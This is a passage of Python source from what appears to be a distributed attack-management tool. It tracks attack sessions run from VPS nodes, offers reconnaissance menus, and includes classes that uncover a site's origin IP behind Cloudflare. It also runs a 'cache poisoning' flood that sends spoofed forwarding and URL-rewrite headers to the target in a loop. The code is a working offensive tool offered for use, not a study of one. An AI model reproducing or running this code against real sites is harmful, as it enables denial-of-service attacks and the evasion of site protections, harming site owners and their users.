            duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
            print(f"Duration: {duration_str}")
        elif session['start_time'] and session['status'] == 'running':
            start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
            duration = (datetime.now() - start).total_seconds()
            duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
            print(f"Duration: {duration_str} (ongoing)")
        
        # VPS nodes
        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
        print(f"VPS Nodes: {len(vps_list)}")
        for vps in vps_list:
            print(f"  - {vps}")
        
        # Parameters
        print("\nParameters:")
        try:
            parameters = json.loads(session['parameters']) if session['parameters'] else {}
            for key, value in parameters.items():
                print(f"  {key}: {value}")
        except:
            print("  Unable to parse parameters")
        
        # Results summary
        results = self.db_manager.get_attack_results(session_id)
        if results:
            print("\nResults Summary:")
            total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
            total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
            total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
            total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
            
            print(f"  Total Connections: {total_connections}")
            print(f"  Total Packets: {total_packets}")
            print(f"  Total Data: {self._format_bytes(total_bytes)}")
            print(f"  Total Errors: {total_errors}")
            
            # Response codes
            response_codes = {}
            for result in results:
                if result['response_codes']:
                    try:
                        codes = json.loads(result['response_codes'])
                        for code, count in codes.items():
                            if code not in response_codes:
                                response_codes[code] = 0
                            response_codes[code] += count
                    except:
                        pass
            
            if response_codes:
                print("\nResponse Codes:")
                for code, count in sorted(response_codes.items()):
                    print(f"  {code}: {count}")
        
        # Notes
        if session['notes']:
            print("\nNotes:")
            print(f"  {session['notes']}")
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        """Attack history menu"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 50)
        
        sessions = self.db_manager.get_attack_sessions(limit=20)
        
        if sessions:
            # Convert to list of lists for table printing
            headers = ["ID", "Session Name", "Target", "Attack Type", "Status", "Started", "Duration"]
            data = []
            
            for session in sessions:
                start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
                
                # Calculate duration
                if session['start_time'] and session['end_time']:
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
                    duration = (end - start).total_seconds()
                    duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
                elif session['start_time'] and session['status'] == 'running':
                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
                    duration = (datetime.now() - start).total_seconds()
                    duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
                else:
                    duration_str = 'N/A'
                
                # Format status
                status = session['status']
                if status == 'running':
                    status_str = f"{Colors.GREEN}{status}{Colors.RESET}"
                elif status == 'completed':
                    status_str = f"{Colors.BLUE}{status}{Colors.RESET}"
                elif status == 'failed':
                    status_str = f"{Colors.RED}{status}{Colors.RESET}"
                else:
                    status_str = f"{Colors.YELLOW}{status}{Colors.RESET}"
                
                data.append([
                    session['id'],
                    session['session_name'],
                    session['target_host'] or session['target_url'],
                    session['attack_type'],
                    status_str,
                    start_time,
                    duration_str
                ])
            
            self.terminal.print_table(headers, data)
            
            session_id = self.terminal.input_with_prompt("\nEnter session ID to view details (or Enter to go back): ", False)
            if session_id and session_id.isdigit():
                self.view_attack_details(int(session_id))
        else:
            print(f"\n{Colors.YELLOW}No attack history{Colors.RESET}")
            input("Press Enter to continue...")
    
    def network_tools_menu(self):
        """Network reconnaissance tools menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            print(f"{Colors.BOLD}NETWORK RECONNAISSANCE TOOLS{Colors.RESET}")
            print("=" * 50)
            
            menu = f"""
{Colors.BOLD}AVAILABLE TOOLS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} DNS Lookup
{Colors.GREEN}[2]{Colors.RESET} DNS History (Find Origin IPs)
{Colors.GREEN}[3]{Colors.RESET} WAF Detection
{Colors.GREEN}[4]{Colors.RESET} Port Scanner
{Colors.GREEN}[5]{Colors.RESET} Cloudflare Detector
{Colors.GREEN}[6]{Colors.RESET} SSL Information
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.dns_lookup_tool()
            elif choice == '2':
                self.dns_history_tool()
            elif choice == '3':
                self.waf_detection_tool()
            elif choice == '4':
                self.port_scanner_tool()
            elif choice == '5':
                self.cloudflare_detector_tool()
            elif choice == '6':
                self.ssl_info_tool()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def dns_lookup_tool(self):
        """DNS lookup tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}DNS LOOKUP TOOL{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        print(f"\n{Colors.YELLOW}[INFO] Looking up DNS records for {domain}...{Colors.RESET}")
        
        try:
            results = self.network_tools.lookup_dns_history(domain)
            
            print(f"\n{Colors.BOLD}CURRENT DNS RECORDS:{Colors.RESET}")
            for record_type, records in results['current_records'].items():
                if records:
                    print(f"{Colors.GREEN}{record_type}:{Colors.RESET}")
                    for record in records:
                        print(f"  {record}")
            
            if results['historical_records']:
                print(f"\n{Colors.BOLD}HISTORICAL DNS RECORDS:{Colors.RESET}")
                for record in results['historical_records']:
                    print(f"  {record['date']} - {record['record_type']}: {record['value']}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in DNS lookup: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def dns_history_tool(self):
        """DNS History tool - Find historical IPs and subdomains"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}DNS HISTORY & ORIGIN IP FINDER{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        # Remove protocol if present
        if domain.startswith('http'):
            parsed = urlparse(domain)
            domain = parsed.hostname or parsed.netloc
        
        print(f"\n{Colors.YELLOW}[INFO] Searching DNS history for {domain}...{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] This may take a moment...{Colors.RESET}\n")
        
        try:
            # Initialize DNS History Tool
            dns_tool = DNSHistoryTool()
            
            # Get DNS history
            dns_tool.get_dns_history(domain)
            
            # Display results
            print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}  DNS HISTORY RESULTS{Colors.RESET}")
            print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
            
            # Current IPs
            if dns_tool.results['current_ips']:
                print(f"{Colors.BOLD}CURRENT IPs:{Colors.RESET}")
                for ip in dns_tool.results['current_ips']:
                    is_cf = dns_tool.is_cloudflare_ip(ip)
                    status = f"{Colors.RED}[Cloudflare]{Colors.RESET}" if is_cf else f"{Colors.GREEN}[Direct]{Colors.RESET}"
                    print(f"  {ip} {status}")
            
            # Historical IPs
            if dns_tool.results['historical_ips']:
                print(f"\n{Colors.BOLD}HISTORICAL IPs:{Colors.RESET}")
                for ip in dns_tool.results['historical_ips']:
                    is_cf = dns_tool.is_cloudflare_ip(ip)
                    status = f"{Colors.RED}[Cloudflare]{Colors.RESET}" if is_cf else f"{Colors.GREEN}[Direct]{Colors.RESET}"
                    print(f"  {ip} {status}")
            
            # Non-Cloudflare IPs (Origin IPs)
            if dns_tool.results['non_cloudflare_ips']:
                print(f"\n{Colors.GREEN}{Colors.BOLD}ORIGIN IPs (Non-Cloudflare):{Colors.RESET}")
                for ip in dns_tool.results['non_cloudflare_ips']:
                    print(f"  {Colors.GREEN}{ip}{Colors.RESET}")
                print(f"\n{Colors.GREEN}[SUCCESS] Found {len(dns_tool.results['non_cloudflare_ips'])} potential origin IP(s){Colors.RESET}")
            else:
                print(f"\n{Colors.YELLOW}[INFO] No non-Cloudflare IPs found{Colors.RESET}")
            
            # Subdomains
            if dns_tool.results['subdomains']:
                print(f"\n{Colors.BOLD}DISCOVERED SUBDOMAINS:{Colors.RESET}")
                for subdomain in dns_tool.results['subdomains'][:20]:  # Show first 20
                    print(f"  {subdomain}")
                if len(dns_tool.results['subdomains']) > 20:
                    print(f"  ... and {len(dns_tool.results['subdomains']) - 20} more")
            
            # DNS Records
            if dns_tool.results['dns_records']:
                print(f"\n{Colors.BOLD}DNS RECORDS:{Colors.RESET}")
                for record_type, values in dns_tool.results['dns_records'].items():
                    if values:
                        print(f"  {record_type}: {', '.join(values)}")
            
            print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}\n")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in DNS history lookup: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def waf_detection_tool(self):
        """WAF detection tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}WAF DETECTION TOOL{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target URL: ")
        if not target:
            return
        
        # Add http:// if not present
        if not target.startswith('http'):
            target = 'http://' + target
        
        print(f"\n{Colors.YELLOW}[INFO] Detecting WAF on {target}...{Colors.RESET}")
        
        try:
            results = self.network_tools.detect_waf(target)
            
            if results['waf_detected']:
                print(f"\n{Colors.GREEN}[DETECTED] WAF detected!{Colors.RESET}")
                print(f"WAF Type: {results['waf_type'] or 'Unknown'}")
                
                print(f"\n{Colors.BOLD}DETECTION EVIDENCE:{Colors.RESET}")
                for evidence in results['evidence']:
                    print(f"  - {evidence}")
            else:
                print(f"\n{Colors.YELLOW}[RESULT] No WAF detected{Colors.RESET}")
                
            if results['cloudflare_detected']:
                print(f"\n{Colors.CYAN}[INFO] Cloudflare protection detected{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in WAF detection: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def port_scanner_tool(self):
        """Port scanner tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}PORT SCANNER TOOL{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target host: ")
        if not target:
            return
        
        # Parse URL if provided
        if target.startswith('http'):
            parsed = urlparse(target)
            target = parsed.hostname or parsed.netloc
        
        port_range = self.terminal.input_with_prompt("Enter port range (e.g., 80,443 or 1-1000): ", False) or "1-1000"
        
        print(f"\n{Colors.YELLOW}[INFO] Scanning ports on {target}...{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] This may take some time depending on the port range...{Colors.RESET}")
        
        try:
            results = self.network_tools.scan_ports(target, port_range)
            
            if results['open_ports']:
                print(f"\n{Colors.GREEN}[RESULT] Open ports found:{Colors.RESET}")
                
                # Convert to list of lists for table printing
                headers = ["Port", "Service", "State", "Banner"]
                data = []
                
                for port_info in results['open_ports']:
                    data.append([
                        port_info['port'],
                        port_info['service'] or 'unknown',
                        f"{Colors.GREEN}open{Colors.RESET}",
                        port_info['banner'] or ''
                    ])
                
                self.terminal.print_table(headers, data)
            else:
                print(f"\n{Colors.YELLOW}[RESULT] No open ports found in the specified range{Colors.RESET}")
            
            print(f"\n{Colors.CYAN}[INFO] Scan completed in {results['scan_time']:.2f} seconds{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in port scanning: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def cloudflare_detector_tool(self):
        """Cloudflare detector tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}CLOUDFLARE DETECTOR TOOL{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        # Remove protocol if present
        if domain.startswith('http'):
            parsed = urlparse(domain)
            domain = parsed.hostname or parsed.netloc
        
        print(f"\n{Colors.YELLOW}[INFO] Detecting Cloudflare protection for {domain}...{Colors.RESET}")
        
        try:
            results = self.network_tools.detect_cloudflare(domain)
            
            if results['is_behind_cloudflare']:
                print(f"\n{Colors.GREEN}[DETECTED] Domain is protected by Cloudflare{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}DETECTION EVIDENCE:{Colors.RESET}")
                for evidence in results['evidence']:
                    print(f"  - {evidence}")
                
                if results['cloudflare_ips']:
                    print(f"\n{Colors.BOLD}CLOUDFLARE IPs:{Colors.RESET}")
                    for ip in results['cloudflare_ips']:
                        print(f"  - {ip}")
                
                if results['direct_ips']:
                    print(f"\n{Colors.BOLD}ALL RESOLVED IPs:{Colors.RESET}")
                    for ip in results['direct_ips']:
                        print(f"  - {ip}")
            else:
                print(f"\n{Colors.YELLOW}[RESULT] Domain does not appear to be behind Cloudflare{Colors.RESET}")
                
                if results['direct_ips']:
                    print(f"\n{Colors.BOLD}RESOLVED IPs:{Colors.RESET}")
                    for ip in results['direct_ips']:
                        print(f"  - {ip}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in Cloudflare detection: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def ssl_info_tool(self):
        """SSL information tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}SSL INFORMATION TOOL{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target host: ")
        if not target:
            return
        
        # Parse URL if provided
        if target.startswith('http'):
            parsed = urlparse(target)
            target = parsed.hostname or parsed.netloc
        
        port = self.terminal.input_with_prompt("Enter port [443]: ", False) or "443"
        try:
            port = int(port)
        except ValueError:
            print(f"{Colors.RED}Invalid port number{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.YELLOW}[INFO] Getting SSL information for {target}:{port}...{Colors.RESET}")
        
        try:
            results = self.network_tools.get_ssl_info(target, port)
            
            if results['has_ssl']:
                print(f"\n{Colors.GREEN}[SUCCESS] SSL/TLS connection established{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}CERTIFICATE INFORMATION:{Colors.RESET}")
                print(f"Subject: {results['subject']}")
                print(f"Issuer: {results['issuer']}")
                print(f"Version: {results['version']}")
                print(f"Serial Number: {results['serial_number']}")
                print(f"Not Before: {results['not_before']}")
                print(f"Not After: {results['not_after']}")
                
                # Check expiration
                if results['is_expired']:
                    print(f"{Colors.RED}[WARNING] Certificate has expired!{Colors.RESET}")
                else:
                    days_left = results['days_left']
                    if days_left < 30:
                        print(f"{Colors.YELLOW}[WARNING] Certificate expires in {days_left} days{Colors.RESET}")
                    else:
                        print(f"{Colors.GREEN}Certificate valid for {days_left} more days{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}SUPPORTED PROTOCOLS:{Colors.RESET}")
                for protocol, supported in results['protocols'].items():
                    status = f"{Colors.GREEN}Supported{Colors.RESET}" if supported else f"{Colors.RED}Not Supported{Colors.RESET}"
                    print(f"{protocol}: {status}")
                
                print(f"\n{Colors.BOLD}CIPHER SUITES:{Colors.RESET}")
                for cipher in results['cipher_suites'][:5]:  # Show only first 5
                    print(f"  - {cipher}")
                
                if len(results['cipher_suites']) > 5:
                    print(f"  ... and {len(results['cipher_suites']) - 5} more")
                
                # Security assessment
                print(f"\n{Colors.BOLD}SECURITY ASSESSMENT:{Colors.RESET}")
                for check, result in results['security_checks'].items():
                    status = f"{Colors.GREEN}Pass{Colors.RESET}" if result['pass'] else f"{Colors.RED}Fail{Colors.RESET}"
                    print(f"{check}: {status}")
                    if result['message']:
                        print(f"  {result['message']}")
            else:
                print(f"\n{Colors.RED}[ERROR] No SSL/TLS connection available{Colors.RESET}")
                if results['error']:
                    print(f"Error: {results['error']}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in SSL information: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        """System status menu"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 50)
        
        # Database status
        print(f"{Colors.BOLD}DATABASE:{Colors.RESET}")
        vps_count = len(self.db_manager.get_all_vps())
        attack_count = len(self.db_manager.get_attack_sessions())
        active_attacks = len(self.db_manager.get_active_attack_sessions())
        
        print(f"VPS Nodes: {vps_count}")
        print(f"Attack Sessions: {attack_count}")
        print(f"Active Attacks: {active_attacks}")
        
        # SSH connections
        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
        connection_count = len(self.ssh_manager.connections)
        print(f"Active Connections: {connection_count}")
        
        if connection_count > 0:
            for ip, conn in self.ssh_manager.connections.items():
                print(f"  - {ip}: {Colors.GREEN}Connected{Colors.RESET}")
        
        # System resources
        if PSUTIL_AVAILABLE:
            print(f"\n{Colors.BOLD}SYSTEM RESOURCES:{Colors.RESET}")
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            print(f"CPU Usage: {cpu_percent}%")
            print(f"Memory Usage: {memory.percent}% ({self._format_bytes(memory.used)}/{self._format_bytes(memory.total)})")
            print(f"Disk Usage: {disk.percent}% ({self._format_bytes(disk.used)}/{self._format_bytes(disk.total)})")
        
        # Network interfaces
        if PSUTIL_AVAILABLE:
            print(f"\n{Colors.BOLD}NETWORK INTERFACES:{Colors.RESET}")
            net_io = psutil.net_io_counters(pernic=True)
            
            for interface, stats in net_io.items():
                print(f"{interface}:")
                print(f"  Sent: {self._format_bytes(stats.bytes_sent)}")
                print(f"  Received: {self._format_bytes(stats.bytes_recv)}")
        
        input("\nPress Enter to continue...")


#############################################################################
# ENHANCED FEATURES - DNS HISTORY & CLOUDFLARE BYPASS
#############################################################################

class DNSHistoryTool:
    """
    DNS History and Subdomain Discovery Tool
    Finds historical IPs and subdomains (especially non-Cloudflare IPs)
    """
    def __init__(self):
        self.results = {
            "subdomains": [],
            "historical_ips": [],
            "current_ips": [],
            "non_cloudflare_ips": [],
            "dns_records": {}
        }
        
        # Cloudflare IP ranges
        self.cloudflare_ranges = [
            "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
            "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
            "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
            "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
            "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22"
        ]
    
    def is_cloudflare_ip(self, ip):
        """Check if IP belongs to Cloudflare"""
        try:
            ip_obj = ipaddress.ip_address(ip)
            for cidr in self.cloudflare_ranges:
                if ip_obj in ipaddress.ip_network(cidr):
                    return True
            return False
        except:
            return False
    
    def enumerate_subdomains(self, domain):
        """Enumerate subdomains using common prefixes"""
        subdomains = []
        common_prefixes = [
            "www", "mail", "ftp", "admin", "webmail", "smtp", "pop", "ns1", "ns2",
            "cpanel", "whm", "autodiscover", "autoconfig", "m", "mobile", "api",
            "dev", "staging", "test", "portal", "vpn", "remote", "blog", "shop",
            "store", "cdn", "static", "media", "img", "images", "video", "download",
            "forum", "support", "help", "docs", "wiki", "status", "monitor", "app",
            "beta", "demo", "old", "new", "secure", "login", "register", "dashboard"
        ]
        
        logger.info(f"Enumerating subdomains for {domain}...")
        print(f"{Colors.YELLOW}[*] Enumerating subdomains for {domain}...{Colors.RESET}")
        
        found_count = 0
        for prefix in common_prefixes:
            subdomain = f"{prefix}.{domain}"
            try:
                if DNS_AVAILABLE:
                    import dns.resolver
                    answers = dns.resolver.resolve(subdomain, 'A', lifetime=2)
                    ips = [str(rdata) for rdata in answers]
                    is_cf = any(self.is_cloudflare_ip(ip) for ip in ips)
                    subdomains.append({
                        "subdomain": subdomain,
                        "ips": ips,
                        "is_cloudflare": is_cf
                    })
                    status = f"{Colors.RED}[CF]{Colors.RESET}" if is_cf else f"{Colors.GREEN}[Direct]{Colors.RESET}"
                    print(f"  {status} {subdomain} -> {', '.join(ips)}")
                    found_count += 1
            except:
                pass
        
        print(f"{Colors.GREEN}[+] Found {found_count} subdomains{Colors.RESET}")
        self.results["subdomains"] = subdomains
        return subdomains
    
    def get_dns_history(self, domain):
        """Get DNS history using various methods"""
        logger.info(f"Fetching DNS history for {domain}...")
        print(f"\\n{Colors.BOLD}=== DNS HISTORY LOOKUP ==={Colors.RESET}\\n")
        print(f"{Colors.YELLOW}[*] Target: {domain}{Colors.RESET}")
        
        try:
            if DNS_AVAILABLE:
                import dns.resolver
                
                # Get current A records
                try:
                    print(f"{Colors.YELLOW}[*] Resolving A records...{Colors.RESET}")
                    answers = dns.resolver.resolve(domain, 'A')
                    current_ips = [str(rdata) for rdata in answers]
                    self.results["current_ips"] = current_ips
                    
                    # Filter non-Cloudflare IPs
                    non_cf_ips = [ip for ip in current_ips if not self.is_cloudflare_ip(ip)]
                    self.results["non_cloudflare_ips"] = non_cf_ips
                    
                    print(f"{Colors.GREEN}[+] Current IPs: {', '.join(current_ips)}{Colors.RESET}")
                    if non_cf_ips:
                        print(f"{Colors.GREEN}[+] Non-Cloudflare IPs: {', '.join(non_cf_ips)}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[!] All IPs are behind Cloudflare{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Failed to resolve A records: {str(e)}{Colors.RESET}")
                
                # Get other DNS records
                record_types = ['MX', 'NS', 'TXT', 'CNAME']
                for record_type in record_types:
                    try:
                        answers = dns.resolver.resolve(domain, record_type)
                        records = [str(rdata) for rdata in answers]
                        self.results["dns_records"][record_type] = records
                        print(f"{Colors.BLUE}[i] {record_type} records ({len(records)}): {', '.join(records[:3])}{Colors.RESET}")
                    except:
                        pass
            else:
                print(f"{Colors.RED}[!] DNS library not available{Colors.RESET}")
                        
        except Exception as e:
            logger.error(f"DNS history lookup failed: {str(e)}")
            print(f"{Colors.RED}[!] DNS lookup failed: {str(e)}{Colors.RESET}")
        
        return self.results
    
    def find_origin_ip(self, domain):
        """Try to find origin IP behind Cloudflare"""
        logger.info(f"Searching for origin IP of {domain}...")
        print(f"\\n{Colors.YELLOW}[*] Searching for origin IP behind Cloudflare...{Colors.RESET}\\n")
        
        # Method 1: Check subdomains for non-Cloudflare IPs
        print(f"{Colors.BLUE}[i] Method 1: Subdomain enumeration{Colors.RESET}")
        subdomains = self.enumerate_subdomains(domain)
        for sub in subdomains:
            if not sub["is_cloudflare"] and sub["ips"]:
                print(f"\\n{Colors.GREEN}[+] ORIGIN IP FOUND via subdomain {sub['subdomain']}: {sub['ips'][0]}{Colors.RESET}")
                return sub["ips"][0]
        
        # Method 2: Check MX records
        print(f"\\n{Colors.BLUE}[i] Method 2: MX record analysis{Colors.RESET}")
        if "MX" in self.results["dns_records"]:
            for mx in self.results["dns_records"]["MX"]:
                try:
                    if DNS_AVAILABLE:
                        import dns.resolver
                        mx_host = str(mx).split()[-1].rstrip('.')
                        print(f"{Colors.YELLOW}[*] Checking MX host: {mx_host}{Colors.RESET}")
                        answers = dns.resolver.resolve(mx_host, 'A')
                        for rdata in answers:
                            ip = str(rdata)
                            if not self.is_cloudflare_ip(ip):
                                print(f"\\n{Colors.GREEN}[+] ORIGIN IP FOUND via MX record: {ip}{Colors.RESET}")
                                return ip
                except Exception as e:
                    logger.debug(f"MX lookup error: {str(e)}")
        
        # Method 3: Check non-Cloudflare IPs from current records
        print(f"\\n{Colors.BLUE}[i] Method 3: Direct IP check{Colors.RESET}")
        if self.results["non_cloudflare_ips"]:
            print(f"{Colors.GREEN}[+] ORIGIN IP FOUND: {self.results['non_cloudflare_ips'][0]}{Colors.RESET}")
            return self.results["non_cloudflare_ips"][0]
        
        print(f"\\n{Colors.RED}[!] Could not find origin IP - target may be fully protected by Cloudflare{Colors.RESET}")
        return None


class CloudflareBypassAttack:
    """
    Advanced Cloudflare Bypass Attack Techniques
    """
    def __init__(self, target, port=443, use_ssl=True):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.origin_ip = None
        self.dns_tool = DNSHistoryTool()
        self.running = False
        self.stats = {
            "requests_sent": 0,
            "errors": 0,
            "start_time": None,
            "end_time": None
        }
        
    def discover_origin_ip(self):
        """Discover origin IP behind Cloudflare"""
        logger.info(f"Attempting to discover origin IP for {self.target}...")
        print(f"\\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  CLOUDFLARE BYPASS - ORIGIN IP DISCOVERY{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\\n")
        
        # Get DNS history and find origin
        self.dns_tool.get_dns_history(self.target)
        self.origin_ip = self.dns_tool.find_origin_ip(self.target)
        
        if self.origin_ip:
            print(f"\\n{Colors.GREEN}{'='*60}{Colors.RESET}")
            print(f"{Colors.GREEN}[SUCCESS] Origin IP discovered: {self.origin_ip}{Colors.RESET}")
            print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\\n")
        else:
            print(f"\\n{Colors.RED}{'='*60}{Colors.RESET}")
            print(f"{Colors.RED}[FAILED] Could not discover origin IP{Colors.RESET}")
            print(f"{Colors.RED}{'='*60}{Colors.RESET}\\n")
        
        return self.origin_ip
    
    def cache_poisoning_attack(self, duration=60):
        """
        Cache Poisoning Attack - Attempts to poison Cloudflare's cache
        """
        self.running = True
        self.stats["start_time"] = time.time()
        
        logger.info(f"Starting Cache Poisoning attack on {self.target}")
        print(f"\\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  CLOUDFLARE BYPASS - CACHE POISONING ATTACK{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\\n")
        print(f"{Colors.YELLOW}[*] Target: {self.target}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duration: {duration} seconds{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Press Ctrl+C to stop{Colors.RESET}\\n")
        
        # Setup signal handler
        original_sigint = signal.getsignal(signal.SIGINT)
        original_sigterm = signal.getsignal(signal.SIGTERM)
        
        def signal_handler(sig, frame):
            print(f"\\n{Colors.RED}[!] Stopping attack...{Colors.RESET}")
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        end_time = time.time() + duration
        last_update = time.time()
        
        try:
            while self.running and time.time() < end_time:
                try:
                    # Craft malicious headers for cache poisoning
                    headers = {
                        'Host': self.target,
                        'X-Forwarded-Host': f'evil-{random.randint(1000,9999)}.{self.target}',
                        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                        'X-Original-URL': f'/admin?cache={random.randint(1,99999)}',
                        'X-Rewrite-URL': f'/admin?poison={random.randint(1,99999)}',
                        'X-Forwarded-Proto': 'https',
                        'X-Forwarded-Port': '443',
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'Expires': '0',
                        'User-Agent': f'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)}'
                    }
                    
                    # Add random cache-busting parameters
                    cache_buster = f'?cb={random.randint(1,999999)}&poison={random.randint(1,999999)}'
                    url = f"{'https' if self.use_ssl else 'http'}://{self.target}{cache_buster}"
                    
                    if REQUESTS_AVAILABLE:
                        response = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
                        self.stats["requests_sent"] += 1
                        
                        # Update status every 5 seconds
                        if time.time() - last_update >= 5:
                            elapsed = int(time.time() - self.stats["start_time"])
                            remaining = int(end_time - time.time())
                            rps = self.stats["requests_sent"] / elapsed if elapsed > 0 else 0
                            
                            print(f"{Colors.GREEN}[+] Requests: {self.stats['requests_sent']} | "
                                  f"RPS: {rps:.1f} | "
                                  f"Errors: {self.stats['errors']} | "
                                  f"Elapsed: {elapsed}s | "
                                  f"Remaining: {remaining}s{Colors.RESET}")
                            last_update = time.time()
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    self.stats["errors"] += 1
                    logger.debug(f"Cache poisoning error: {str(e)}")
                
                time.sleep(0.01)  # Small delay to prevent overwhelming
            
            self.stats["end_time"] = time.time()
            duration_actual = self.stats["end_time"] - self.stats["start_time"]
            
            print(f"\\n{Colors.BOLD}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}  ATTACK COMPLETED{Colors.RESET}")
            print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\\n")
            print(f"{Colors.GREEN}[+] Total requests sent: {self.stats['requests_sent']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Average RPS: {self.stats['requests_sent']/duration_actual:.2f}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Total errors: {self.stats['errors']}{Colors.RESET}")
            print(f"{Colors.BLUE}[i] Duration: {duration_actual:.2f} seconds{Colors.RESET}\\n")
            
        except Exception as e:
            logger.error(f"Attack error: {str(e)}")
            print(f"{Colors.RED}[!] Attack error: {str(e)}{Colors.RESET}")
        
        finally:
            self.running = False
            # Restore original signal handlers
            signal.signal(signal.SIGINT, original_sigint)
            signal.signal(signal.SIGTERM, original_sigterm)


class TargetHealthMonitor:
    """
